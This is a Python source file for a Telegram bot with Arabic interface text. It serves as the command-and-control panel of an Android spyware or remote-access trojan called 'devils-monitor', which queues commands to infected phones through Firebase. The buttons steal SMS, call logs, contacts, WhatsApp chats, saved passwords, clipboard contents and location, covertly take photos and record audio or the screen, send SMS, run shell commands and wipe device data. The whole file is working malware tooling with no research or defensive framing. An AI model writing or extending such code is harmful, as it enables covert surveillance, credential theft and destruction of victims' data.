import os
import time
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "ضع_التوكن")
FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://devils-monitor-default-rtdb.firebaseio.com")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))

def fb_get(path):
    try:
        r = requests.get(f"{FIREBASE_URL}/{path}.json", timeout=15)
        return r.json() if r.status_code == 200 else None
    except: return None

def fb_push(path, data):
    try:
        r = requests.post(f"{FIREBASE_URL}/{path}.json", json=data, timeout=15)
        return r.status_code == 200
    except: return False

def is_admin(uid):
    return ADMIN_ID == 0 or uid == ADMIN_ID

def devices_kb():
    devices = fb_get("devices") or {}
    kb = []
    for did, info in devices.items():
        model = info.get("model", "Unknown")
        status = info.get("status", "offline")
        e = "🟢" if status == "online" else "🔴"
        kb.append([InlineKeyboardButton(f"{e} {model} ({did[:6]})", callback_data=f"dev:{did}")])
    kb.append([InlineKeyboardButton("🔄 تحديث", callback_data="refresh")])
    return InlineKeyboardMarkup(kb), bool(devices)

def control_kb(did):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 معلومات", callback_data=f"cmd:{did}:get_system_info"),
         InlineKeyboardButton("🔋 بطارية", callback_data=f"cmd:{did}:get_battery")],
        [InlineKeyboardButton("📍 موقع", callback_data=f"cmd:{did}:get_location"),
         InlineKeyboardButton("🖼️ صور", callback_data=f"cmd:{did}:get_gallery")],
        [InlineKeyboardButton("📁 ملفات", callback_data=f"cmd:{did}:get_files"),
         InlineKeyboardButton("📱 تطبيقات", callback_data=f"cmd:{did}:get_installed_apps")],
        [InlineKeyboardButton("📞 مكالمات", callback_data=f"cmd:{did}:get_call_log"),
         InlineKeyboardButton("💬 SMS", callback_data=f"cmd:{did}:get_sms_log")],
        [InlineKeyboardButton("👥 جهات", callback_data=f"cmd:{did}:get_contacts"),
         InlineKeyboardButton("🎯 Clipboard", callback_data=f"cmd:{did}:get_clipboard")],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data=f"cmd:{did}:torch_on"),
         InlineKeyboardButton("🔦 فلاش OFF", callback_data=f"cmd:{did}:torch_off")],
        [InlineKeyboardButton("📳 اهتزاز", callback_data=f"cmd:{did}:vibrate"),
         InlineKeyboardButton("🔔 إشعار", callback_data=f"menu:{did}:notify")],
        [InlineKeyboardButton("🔒 قفل", callback_data=f"cmd:{did}:lock"),
         InlineKeyboardButton("🔊 صوت", callback_data=f"menu:{did}:speak")],
        [InlineKeyboardButton("💬 رسالة", callback_data=f"menu:{did}:sms"),
         InlineKeyboardButton("🖥️ Shell", callback_data=f"menu:{did}:shell")],
        [InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{did}:take_photo_front"),
         InlineKeyboardButton("📸 خلفية", callback_data=f"cmd:{did}:take_photo_back")],
        [InlineKeyboardButton("🎤 تسجيل صوت", callback_data=f"cmd:{did}:record_audio"),
         InlineKeyboardButton("🖥️ تسجيل شاشة", callback_data=f"cmd:{did}:record_screen")],
        [InlineKeyboardButton("💬 دردشات واتساب", callback_data=f"cmd:{did}:get_whatsapp"),
         InlineKeyboardButton("🔑 كلمات", callback_data=f"cmd:{did}:get_passwords")],
        [InlineKeyboardButton("🗑️ مسح البيانات", callback_data=f"cmd:{did}:wipe_data")],
        [InlineKeyboardButton("◀️ رجوع", callback_data="refresh")],
    ])

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("غير مصرح."); return
    kb, has = devices_kb()
    msg = "📱 الأجهزة المتصلة:" if has else "⚠️ لا يوجد أجهزة."
    await update.message.reply_text(msg, reply_markup=kb)

async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id): return
    data = q.data

    if data == "refresh":
        kb, has = devices_kb()
        msg = "📱 الأجهزة المتصلة:" if has else "⚠️ لا يوجد أجهزة."
        await q.edit_message_text(msg, reply_markup=kb)
        return

    if data.startswith("dev:"):
        did = data.split(":", 1)[1]
        await q.edit_message_text(f"🎛️ التحكم بالجهاز:\n`{did}`",
                                  reply_markup=control_kb(did), parse_mode="Markdown")
        return

    if data.startswith("cmd:"):
        _, did, cmd = data.split(":", 2)
        fb_push(f"commands/{did}", {"type": cmd, "timestamp": int(time.time()*1000)})
        await q.answer("✅ تم الإرسال", show_alert=False)
        return

    if data.startswith("menu:"):
        _, did, menu = data.split(":", 2)
        ctx.user_data["menu_device"] = did
        ctx.user_data["menu_type"] = menu
        prompts = {"sms": "أرسل: رقم|رسالة", "notify": "نص الإشعار", "speak": "النص", "shell": "الأمر"}
        await q.edit_message_text(f"✍️ {prompts.get(menu, 'أرسل النص')}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ رجوع", callback_data=f"dev:{did}")]]))
        return

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    did = ctx.user_data.get("menu_device")
    mtype = ctx.user_data.get("menu_type")
    if not did or not mtype: return

    text = update.message.text
    if mtype == "sms":
        try:
            phone, msg = text.split("|", 1)
            fb_push(f"commands/{did}", {"type": "send_sms", "phoneNumber": phone.strip(),
                                       "message": msg.strip(), "timestamp": int(time.time()*1000)})
            await update.message.reply_text("✅ تم")
        except:
            await update.message.reply_text("❌ صيغة: رقم|رسالة")
    elif mtype == "notify":
        fb_push(f"commands/{did}", {"type": "show_notification", "title": "System",
                                   "message": text, "timestamp": int(time.time()*1000)})
        await update.message.reply_text("✅ تم")
    elif mtype == "speak":
        fb_push(f"commands/{did}", {"type": "speak", "text": text, "timestamp": int(time.time()*1000)})
        await update.message.reply_text("✅ تم")
    elif mtype == "shell":
        fb_push(f"commands/{did}", {"type": "shell", "command": text, "timestamp": int(time.time()*1000)})
        await update.message.reply_text("✅ تم")

    ctx.user_data["menu_device"] = None
    ctx.user_data["menu_type"] = None

def main():
    if not BOT_TOKEN or BOT_TOKEN == "ضع_التوكن":
        print("⚠️ ضع BOT_TOKEN!"); return
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    from telegram.ext import MessageHandler, filters
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    print("🤖 البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
